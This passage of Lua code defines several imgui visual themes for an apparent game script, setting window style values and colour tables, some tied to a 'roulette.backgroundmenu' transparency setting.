    style.GrabMinSize = 17.0
    style.GrabRounding = 16.0
    style.WindowTitleAlign = imgui.ImVec2(0.5, 0.5)
    style.ButtonTextAlign = imgui.ImVec2(0.5, 0.5)


    colors[clr.Text]                   = ImVec4(0.90, 0.90, 0.90, 1.00)
    colors[clr.TextDisabled]           = ImVec4(1.00, 1.00, 1.00, 1.00)
    colors[clr.WindowBg]               = ImVec4(0.00, 0.00, 0.00, roulette.backgroundmenu.v / 100)
    colors[clr.ChildWindowBg]          = ImVec4(0.00, 0.00, 0.00, roulette.backgroundmenu.v / 100)
    colors[clr.PopupBg]                = ImVec4(0.00, 0.00, 0.00, 1.00)
    colors[clr.Border]                 = ImVec4(0.82, 0.77, 0.78, 1.00)
    colors[clr.BorderShadow]           = ImVec4(0.35, 0.35, 0.35, 0.66)
    colors[clr.FrameBg]                = ImVec4(1.00, 1.00, 1.00, 0.28)
    colors[clr.FrameBgHovered]         = ImVec4(0.68, 0.68, 0.68, 0.67)
    colors[clr.FrameBgActive]          = ImVec4(0.79, 0.73, 0.73, 0.62)
    colors[clr.TitleBg]                = ImVec4(0.00, 0.00, 0.00, roulette.backgroundmenu.v / 100)
    colors[clr.TitleBgActive]          = ImVec4(0.46, 0.46, 0.46, roulette.backgroundmenu.v / 100)
    colors[clr.TitleBgCollapsed]       = ImVec4(0.00, 0.00, 0.00, 1.00)
    colors[clr.MenuBarBg]              = ImVec4(0.00, 0.00, 0.00, roulette.backgroundmenu.v / 100)
    colors[clr.ScrollbarBg]            = ImVec4(0.00, 0.00, 0.00, 0.60)
    colors[clr.ScrollbarGrab]          = ImVec4(1.00, 1.00, 1.00, 0.87)
    colors[clr.ScrollbarGrabHovered]   = ImVec4(1.00, 1.00, 1.00, 0.79)
    colors[clr.ScrollbarGrabActive]    = ImVec4(0.80, 0.50, 0.50, 0.40)
    colors[clr.ComboBg]                = ImVec4(0.24, 0.24, 0.24, 0.99)
    colors[clr.CheckMark]              = ImVec4(0.99, 0.99, 0.99, 0.52)
    colors[clr.SliderGrab]             = ImVec4(1.00, 1.00, 1.00, 0.42)
    colors[clr.SliderGrabActive]       = ImVec4(0.76, 0.76, 0.76, 1.00)
    colors[clr.Button]                 = ImVec4(0.51, 0.51, 0.51, 0.60)
    colors[clr.ButtonHovered]          = ImVec4(0.68, 0.68, 0.68, 1.00)
    colors[clr.ButtonActive]           = ImVec4(0.67, 0.67, 0.67, 1.00)
    colors[clr.Header]                 = ImVec4(0.72, 0.72, 0.72, 0.54)
    colors[clr.HeaderHovered]          = ImVec4(0.92, 0.92, 0.95, 0.77)
    colors[clr.HeaderActive]           = ImVec4(0.82, 0.82, 0.82, 0.80)
    colors[clr.Separator]              = ImVec4(0.73, 0.73, 0.73, 1.00)
    colors[clr.SeparatorHovered]       = ImVec4(0.81, 0.81, 0.81, 1.00)
    colors[clr.SeparatorActive]        = ImVec4(0.74, 0.74, 0.74, 1.00)
    colors[clr.ResizeGrip]             = ImVec4(0.80, 0.80, 0.80, 0.30)
    colors[clr.ResizeGripHovered]      = ImVec4(0.95, 0.95, 0.95, 0.60)
    colors[clr.ResizeGripActive]       = ImVec4(1.00, 1.00, 1.00, 0.90)
    colors[clr.CloseButton]            = ImVec4(0.45, 0.45, 0.45, 0.50)
    colors[clr.CloseButtonHovered]     = ImVec4(0.70, 0.70, 0.90, 0.60)
    colors[clr.CloseButtonActive]      = ImVec4(0.70, 0.70, 0.70, 1.00)
    colors[clr.PlotLines]              = ImVec4(1.00, 1.00, 1.00, 1.00)
    colors[clr.PlotLinesHovered]       = ImVec4(1.00, 1.00, 1.00, 1.00)
    colors[clr.PlotHistogram]          = ImVec4(1.00, 1.00, 1.00, 1.00)
    colors[clr.PlotHistogramHovered]   = ImVec4(1.00, 1.00, 1.00, 1.00)
    colors[clr.TextSelectedBg]         = ImVec4(1.00, 1.00, 1.00, 0.35)
    colors[clr.ModalWindowDarkening]   = ImVec4(0.88, 0.88, 0.88, 0.35)
end

function theme6()
	imgui.SwitchContext()
   local style = imgui.GetStyle()
   local colors = style.Colors
   local clr = imgui.Col
   local ImVec4 = imgui.ImVec4
   local ImVec2 = imgui.ImVec2

    style.WindowPadding = ImVec2(15, 15)
    style.WindowRounding = 15.0
    style.FramePadding = ImVec2(5, 5)
    style.ItemSpacing = ImVec2(12, 8)
    style.ItemInnerSpacing = ImVec2(8, 6)
    style.IndentSpacing = 25.0
    style.ScrollbarSize = 15.0
    style.ScrollbarRounding = 15.0
    style.GrabMinSize = 15.0
    style.GrabRounding = 7.0
    style.ChildWindowRounding = 8.0
    style.FrameRounding = 6.0
  

      colors[clr.Text] = ImVec4(0.95, 0.96, 0.98, 1.00)
      colors[clr.TextDisabled] = ImVec4(0.36, 0.42, 0.47, 1.00)
      colors[clr.WindowBg] = ImVec4(0.11, 0.15, 0.17, roulette.backgroundmenu.v / 100)
      colors[clr.ChildWindowBg] = ImVec4(0.15, 0.18, 0.22, roulette.backgroundmenu.v / 100)
      colors[clr.PopupBg] = ImVec4(0.08, 0.08, 0.08, 0.94)
      colors[clr.Border] = ImVec4(0.43, 0.43, 0.50, 0.50)
      colors[clr.BorderShadow] = ImVec4(0.00, 0.00, 0.00, 0.00)
      colors[clr.FrameBg] = ImVec4(0.20, 0.25, 0.29, 1.00)
      colors[clr.FrameBgHovered] = ImVec4(0.12, 0.20, 0.28, 1.00)
      colors[clr.FrameBgActive] = ImVec4(0.09, 0.12, 0.14, 1.00)
      colors[clr.TitleBg] = ImVec4(0.09, 0.12, 0.14, roulette.backgroundmenu.v / 100)
      colors[clr.TitleBgCollapsed] = ImVec4(0.00, 0.00, 0.00, 0.51)
      colors[clr.TitleBgActive] = ImVec4(0.08, 0.10, 0.12, roulette.backgroundmenu.v / 100)
      colors[clr.MenuBarBg] = ImVec4(0.15, 0.18, 0.22, roulette.backgroundmenu.v / 100)
      colors[clr.ScrollbarBg] = ImVec4(0.02, 0.02, 0.02, 0.39)
      colors[clr.ScrollbarGrab] = ImVec4(0.20, 0.25, 0.29, 1.00)
      colors[clr.ScrollbarGrabHovered] = ImVec4(0.18, 0.22, 0.25, 1.00)
      colors[clr.ScrollbarGrabActive] = ImVec4(0.09, 0.21, 0.31, 1.00)
      colors[clr.ComboBg] = ImVec4(0.20, 0.25, 0.29, 1.00)
      colors[clr.CheckMark] = ImVec4(0.28, 0.56, 1.00, 1.00)
      colors[clr.SliderGrab] = ImVec4(0.28, 0.56, 1.00, 1.00)
      colors[clr.SliderGrabActive] = ImVec4(0.37, 0.61, 1.00, 1.00)
      colors[clr.Button] = ImVec4(0.20, 0.25, 0.29, 1.00)
      colors[clr.ButtonHovered] = ImVec4(0.28, 0.56, 1.00, 1.00)
      colors[clr.ButtonActive] = ImVec4(0.06, 0.53, 0.98, 1.00)
      colors[clr.Header] = ImVec4(0.20, 0.25, 0.29, 0.55)
      colors[clr.HeaderHovered] = ImVec4(0.26, 0.59, 0.98, 0.80)
      colors[clr.HeaderActive] = ImVec4(0.26, 0.59, 0.98, 1.00)
      colors[clr.ResizeGrip] = ImVec4(0.26, 0.59, 0.98, 0.25)
      colors[clr.ResizeGripHovered] = ImVec4(0.26, 0.59, 0.98, 0.67)
      colors[clr.ResizeGripActive] = ImVec4(0.06, 0.05, 0.07, 1.00)
      colors[clr.CloseButton] = ImVec4(0.40, 0.39, 0.38, 0.16)
      colors[clr.CloseButtonHovered] = ImVec4(0.40, 0.39, 0.38, 0.39)
      colors[clr.CloseButtonActive] = ImVec4(0.40, 0.39, 0.38, 1.00)
      colors[clr.PlotLines] = ImVec4(0.61, 0.61, 0.61, 1.00)
      colors[clr.PlotLinesHovered] = ImVec4(1.00, 0.43, 0.35, 1.00)
      colors[clr.PlotHistogram] = ImVec4(0.90, 0.70, 0.00, 1.00)
      colors[clr.PlotHistogramHovered] = ImVec4(1.00, 0.60, 0.00, 1.00)
      colors[clr.TextSelectedBg] = ImVec4(0.25, 1.00, 0.00, 0.43)
      colors[clr.ModalWindowDarkening] = ImVec4(1.00, 0.98, 0.95, 0.73)
end

function theme7()
	imgui.SwitchContext()
    local style = imgui.GetStyle()
    local colors = style.Colors
    local clr = imgui.Col
    local ImVec4 = imgui.ImVec4
    local ImVec2 = imgui.ImVec2

    style.WindowPadding = imgui.ImVec2(8, 8)
    style.WindowRounding = 6
    style.ChildWindowRounding = 5
    style.FramePadding = imgui.ImVec2(5, 3)
    style.FrameRounding = 3.0
    style.ItemSpacing = imgui.ImVec2(5, 4)
    style.ItemInnerSpacing = imgui.ImVec2(4, 4)
    style.IndentSpacing = 21
    style.ScrollbarSize = 10.0
    style.ScrollbarRounding = 13
    style.GrabMinSize = 8
    style.GrabRounding = 1
    style.WindowTitleAlign = imgui.ImVec2(0.5, 0.5)
    style.ButtonTextAlign = imgui.ImVec2(0.5, 0.5)

    colors[clr.Text]                   = ImVec4(0.95, 0.96, 0.98, 1.00);
    colors[clr.TextDisabled]           = ImVec4(0.29, 0.29, 0.29, 1.00);
    colors[clr.WindowBg]               = ImVec4(0.14, 0.14, 0.14, roulette.backgroundmenu.v / 100);
    colors[clr.ChildWindowBg]          = ImVec4(0.12, 0.12, 0.12, roulette.backgroundmenu.v / 100);
    colors[clr.PopupBg]                = ImVec4(0.08, 0.08, 0.08, 0.94);
    colors[clr.Border]                 = ImVec4(0.14, 0.14, 0.14, 1.00);
    colors[clr.BorderShadow]           = ImVec4(1.00, 1.00, 1.00, 0.10);
    colors[clr.FrameBg]                = ImVec4(0.22, 0.22, 0.22, 1.00);
    colors[clr.FrameBgHovered]         = ImVec4(0.18, 0.18, 0.18, 1.00);
    colors[clr.FrameBgActive]          = ImVec4(0.09, 0.12, 0.14, 1.00);
    colors[clr.TitleBg]                = ImVec4(0.14, 0.14, 0.14, roulette.backgroundmenu.v / 100);
    colors[clr.TitleBgActive]          = ImVec4(0.14, 0.14, 0.14, roulette.backgroundmenu.v / 100);
    colors[clr.TitleBgCollapsed]       = ImVec4(0.00, 0.00, 0.00, 0.51);
    colors[clr.MenuBarBg]              = ImVec4(0.20, 0.20, 0.20, roulette.backgroundmenu.v / 100);
    colors[clr.ScrollbarBg]            = ImVec4(0.02, 0.02, 0.02, 0.39);
    colors[clr.ScrollbarGrab]          = ImVec4(0.36, 0.36, 0.36, 1.00);
    colors[clr.ScrollbarGrabHovered]   = ImVec4(0.18, 0.22, 0.25, 1.00);
    colors[clr.ScrollbarGrabActive]    = ImVec4(0.24, 0.24, 0.24, 1.00);
    colors[clr.ComboBg]                = ImVec4(0.24, 0.24, 0.24, 1.00);
    colors[clr.CheckMark]              = ImVec4(1.00, 0.28, 0.28, 1.00);
    colors[clr.SliderGrab]             = ImVec4(1.00, 0.28, 0.28, 1.00);
    colors[clr.SliderGrabActive]       = ImVec4(1.00, 0.28, 0.28, 1.00);
    colors[clr.Button]                 = ImVec4(1.00, 0.28, 0.28, 1.00);
    colors[clr.ButtonHovered]          = ImVec4(1.00, 0.39, 0.39, 1.00);
    colors[clr.ButtonActive]           = ImVec4(1.00, 0.21, 0.21, 1.00);
    colors[clr.Header]                 = ImVec4(1.00, 0.28, 0.28, 1.00);
    colors[clr.HeaderHovered]          = ImVec4(1.00, 0.39, 0.39, 1.00);
    colors[clr.HeaderActive]           = ImVec4(1.00, 0.21, 0.21, 1.00);
    colors[clr.ResizeGrip]             = ImVec4(1.00, 0.28, 0.28, 1.00);
    colors[clr.ResizeGripHovered]      = ImVec4(1.00, 0.39, 0.39, 1.00);
    colors[clr.ResizeGripActive]       = ImVec4(1.00, 0.19, 0.19, 1.00);
    colors[clr.CloseButton]            = ImVec4(0.40, 0.39, 0.38, 0.16);
    colors[clr.CloseButtonHovered]     = ImVec4(0.40, 0.39, 0.38, 0.39);
    colors[clr.CloseButtonActive]      = ImVec4(0.40, 0.39, 0.38, 1.00);
    colors[clr.PlotLines]              = ImVec4(0.61, 0.61, 0.61, 1.00);
    colors[clr.PlotLinesHovered]       = ImVec4(1.00, 0.43, 0.35, 1.00);
    colors[clr.PlotHistogram]          = ImVec4(1.00, 0.21, 0.21, 1.00);
    colors[clr.PlotHistogramHovered]   = ImVec4(1.00, 0.18, 0.18, 1.00);
    colors[clr.TextSelectedBg]         = ImVec4(1.00, 0.32, 0.32, 1.00);
    colors[clr.ModalWindowDarkening]   = ImVec4(0.26, 0.26, 0.26, 0.60);
end

function theme8()
	imgui.SwitchContext()
  local style = imgui.GetStyle()
  local colors = style.Colors
  local clr = imgui.Col
  local ImVec4 = imgui.ImVec4
  local ImVec2 = imgui.ImVec2

  style.FramePadding = ImVec2(4.0, 2.0)
  style.ItemSpacing = ImVec2(8.0, 2.0)
  style.WindowRounding = 1.0
  style.FrameRounding = 1.0
  style.ScrollbarRounding = 1.0
  style.GrabRounding = 1.0

  colors[clr.Text] = ImVec4(1.00, 1.00, 1.00, 0.95)
  colors[clr.TextDisabled] = ImVec4(0.50, 0.50, 0.50, 1.00)
  colors[clr.WindowBg] = ImVec4(0.13, 0.12, 0.12, roulette.backgroundmenu.v / 100)
  colors[clr.ChildWindowBg] = ImVec4(0.13, 0.12, 0.12, roulette.backgroundmenu.v / 100)
  colors[clr.PopupBg] = ImVec4(0.05, 0.05, 0.05, 0.94)
  colors[clr.Border] = ImVec4(0.53, 0.53, 0.53, 0.46)
  colors[clr.BorderShadow] = ImVec4(0.00, 0.00, 0.00, 0.00)
  colors[clr.FrameBg] = ImVec4(0.00, 0.00, 0.00, 0.85)
  colors[clr.FrameBgHovered] = ImVec4(0.22, 0.22, 0.22, 0.40)
  colors[clr.FrameBgActive] = ImVec4(0.16, 0.16, 0.16, 0.53)
  colors[clr.TitleBg] = ImVec4(0.00, 0.00, 0.00, roulette.backgroundmenu.v / 100)
  colors[clr.TitleBgActive] = ImVec4(0.00, 0.00, 0.00, roulette.backgroundmenu.v / 100)
  colors[clr.TitleBgCollapsed] = ImVec4(0.00, 0.00, 0.00, 0.51)
  colors[clr.MenuBarBg] = ImVec4(0.12, 0.12, 0.12, roulette.backgroundmenu.v / 100)
  colors[clr.ScrollbarBg] = ImVec4(0.02, 0.02, 0.02, 0.53)
  colors[clr.ScrollbarGrab] = ImVec4(0.31, 0.31, 0.31, 1.00)
  colors[clr.ScrollbarGrabHovered] = ImVec4(0.41, 0.41, 0.41, 1.00)
  colors[clr.ScrollbarGrabActive] = ImVec4(0.48, 0.48, 0.48, 1.00)
  colors[clr.ComboBg] = ImVec4(0.24, 0.24, 0.24, 0.99)
  colors[clr.CheckMark] = ImVec4(0.79, 0.79, 0.79, 1.00)
  colors[clr.SliderGrab] = ImVec4(0.48, 0.47, 0.47, 0.91)
  colors[clr.SliderGrabActive] = ImVec4(0.56, 0.55, 0.55, 0.62)
  colors[clr.Button] = ImVec4(0.50, 0.50, 0.50, 0.63)
  colors[clr.ButtonHovered] = ImVec4(0.67, 0.67, 0.68, 0.63)
  colors[clr.ButtonActive] = ImVec4(0.26, 0.26, 0.26, 0.63)
  colors[clr.Header] = ImVec4(0.54, 0.54, 0.54, 0.58)
  colors[clr.HeaderHovered] = ImVec4(0.64, 0.65, 0.65, 0.80)
  colors[clr.HeaderActive] = ImVec4(0.25, 0.25, 0.25, 0.80)
  colors[clr.Separator] = ImVec4(0.58, 0.58, 0.58, 0.50)
  colors[clr.SeparatorHovered] = ImVec4(0.81, 0.81, 0.81, 0.64)
  colors[clr.SeparatorActive] = ImVec4(0.81, 0.81, 0.81, 0.64)
  colors[clr.ResizeGrip] = ImVec4(0.87, 0.87, 0.87, 0.53)
  colors[clr.ResizeGripHovered] = ImVec4(0.87, 0.87, 0.87, 0.74)
  colors[clr.ResizeGripActive] = ImVec4(0.87, 0.87, 0.87, 0.74)
  colors[clr.CloseButton] = ImVec4(0.45, 0.45, 0.45, 0.50)
  colors[clr.CloseButtonHovered] = ImVec4(0.70, 0.70, 0.90, 0.60)
  colors[clr.CloseButtonActive] = ImVec4(0.70, 0.70, 0.70, 1.00)
  colors[clr.PlotLines] = ImVec4(0.68, 0.68, 0.68, 1.00)
  colors[clr.PlotLinesHovered] = ImVec4(0.68, 0.68, 0.68, 1.00)
  colors[clr.PlotHistogram] = ImVec4(0.90, 0.77, 0.33, 1.00)
  colors[clr.PlotHistogramHovered] = ImVec4(0.87, 0.55, 0.08, 1.00)
  colors[clr.TextSelectedBg] = ImVec4(0.47, 0.60, 0.76, 0.47)
  colors[clr.ModalWindowDarkening] = ImVec4(0.88, 0.88, 0.88, 0.35)
end